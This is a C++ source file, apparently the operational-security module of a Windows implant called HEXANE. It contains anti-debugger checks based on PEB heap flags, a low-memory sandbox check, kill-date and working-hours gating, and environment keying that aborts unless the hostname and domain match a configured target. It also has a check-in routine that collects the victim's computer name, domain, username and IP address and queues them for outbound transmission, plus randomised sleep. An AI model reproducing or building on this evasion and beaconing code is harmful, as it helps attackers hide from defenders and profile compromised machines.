#include <core/include/opsec.hpp>
namespace Opsec {

    VOID SeRuntimeCheck() {
        HEXANE

        do {
#ifndef DEBUG
            Opsec::SeCheckDebugger();
            if (ntstatus != ERROR_SUCCESS) {

                Utils::Random::Timeout(SECONDS(1));
                return_defer(ERROR_BAD_ENVIRONMENT);
            }
#endif
            Opsec::SeCheckSandbox();
            if (ntstatus != ERROR_SUCCESS) {

                Utils::Random::Timeout(SECONDS(1));
                return_defer(ERROR_BAD_ENVIRONMENT);
            }
            break;
        } while (TRUE);

        defer:
    }

    BOOL CheckTime() {
        HEXANE

        if (Ctx->Config.Killdate != 0) {
            if (Utils::Time::GetTimeNow() >= Ctx->Config.Killdate) {
                Commands::Shutdown(nullptr);
            }
        }

        if (Ctx->Config.WorkingHours != 0) {
            if (!Utils::Time::InWorkingHours()) {
                return FALSE;
            }
        }

        return TRUE;
    }

    VOID SeCheckDebugger() {
        HEXANE

        PVOID pHeapBase             = { };
        ULONG HeapFlagsOffset       = 0;
        ULONG HeapForceFlagsOffset  = 0;
        BOOL VistaOrGreater         = Ctx->Session.OSVersion >= WIN_VERSION_2008;

        BOOL m_x32                  = FALSE;
        PPEB pPeb                   = PEB_POINTER;

        Ctx->win32.IsWow64Process(NtCurrentProcess(), &m_x32);

#ifndef _M_AMD64
        pHeapBase = !m_x32
                    ? C_PTR(*(ULONG_PTR*)(B_PTR(pPeb) + 0x18))
                    : C_PTR(*(ULONG_PTR*)(B_PTR(pPeb) + 0x1030));

        HeapFlagsOffset 		= VistaOrGreater ? 0x40 : 0x0C;
        HeapForceFlagsOffset 	= VistaOrGreater ? 0x44 : 0x10;
#else
        pHeapBase               = C_PTR(*R_CAST(ULONG_PTR*, R_CAST(PBYTE, pPeb) + 0x30));
        HeapFlagsOffset         = VistaOrGreater ? 0x70 : 0x14;
        HeapForceFlagsOffset    = VistaOrGreater ? 0x74 : 0x18;
#endif
        auto HeapFlags          = R_CAST(ULONG_PTR*, S_CAST(PBYTE, pHeapBase) + HeapFlagsOffset);
        auto HeapForceFlags     = R_CAST(ULONG_PTR*, S_CAST(PBYTE, pHeapBase) + HeapForceFlagsOffset);

        ((*HeapFlags & ~HEAP_GROWABLE) || (*HeapForceFlags != 0))
            ? ntstatus = (ERROR_DEVICE_ALREADY_ATTACHED)
            : ntstatus = (ERROR_SUCCESS);
    }

    VOID SeCheckSandbox() {
        // todo: check ACPI tables for vm vendors instead of just checking memory
        HEXANE

        MEMORYSTATUSEX stats = { };
        stats.dwLength = sizeof(stats);

        Ctx->win32.GlobalMemoryStatusEx(&stats);
        stats.ullAvailPhys <= 4
            ? ntstatus = ERROR_NOT_ENOUGH_MEMORY
            : ntstatus = ERROR_SUCCESS;
    }

    VOID SeCheckEnvironment() {
        HEXANE

        _stream *entry              = Stream::CreateStreamWithHeaders(TypeCheckin);
        IP_ADAPTER_INFO adapter     = { };

        char buffer[MAX_PATH]       = { };
        unsigned long length        = MAX_PATH;

        if (!entry) {
            return_defer(ERROR_NO_DATA);
        }

        if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, R_CAST(LPSTR, buffer), &length)) {
            if (x_strncmp(Ctx->Config.Hostname, buffer, x_strlen(Ctx->Config.Hostname)) != 0) {
                return_defer(ERROR_BAD_ENVIRONMENT);
            }
            Stream::PackString(entry, buffer);

        } else {
            Stream::PackDword(entry, 0);
        }

        x_memset(buffer, 0, MAX_PATH);
        length = MAX_PATH;

        if (Ctx->Transport.Domain[0] != NULTERM) {
            if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, R_CAST(LPSTR, buffer), &length)) {
                if (x_strncmp(Ctx->Transport.Domain, buffer, x_strlen(Ctx->Transport.Domain)) != 0) {
                    return_defer(ERROR_BAD_ENVIRONMENT);
                }
                Stream::PackString(entry, buffer);

            } else {
                Stream::PackDword(entry, 0);
            }
        }

        x_memset(buffer, 0, MAX_PATH);
        length = MAX_PATH;

        if (Ctx->win32.GetUserNameA(R_CAST(LPSTR, buffer), &length)) {
            Stream::PackString(entry, buffer);
        } else {
            Stream::PackDword(entry, 0);
        }

        x_memset(buffer, 0, length);
        length = sizeof(IP_ADAPTER_INFO);

        if (Ctx->win32.GetAdaptersInfo(&adapter, &length) == NO_ERROR) {
            Stream::PackString(entry, adapter.IpAddressList.IpAddress.String);
        } else {
            Stream::PackDword(entry, 0);
        }

        x_memset(&adapter, 0, sizeof(IP_ADAPTER_INFO));

    defer:
        Dispatcher::OutboundQueue(entry);
    }

    VOID SeImageCheck(const _executable *const source, const _executable *const target) {
        HEXANE

        if (source->ntHead->Signature != IMAGE_NT_SIGNATURE) {
            ntstatus = ERROR_INVALID_EXE_SIGNATURE;
            return;
        }
        if (target->ntHead->FileHeader.Machine != source->ntHead->FileHeader.Machine) {
            ntstatus = ERROR_IMAGE_MACHINE_TYPE_MISMATCH;
            return;
        }
        if (target->ntHead->OptionalHeader.Subsystem != source->ntHead->OptionalHeader.Subsystem) {
            ntstatus = ERROR_IMAGE_SUBSYSTEM_NOT_PRESENT;
        }
    }

    VOID SleepObf() {
        Utils::Random::Timeout(Utils::Random::RandomSleepTime());
    }
}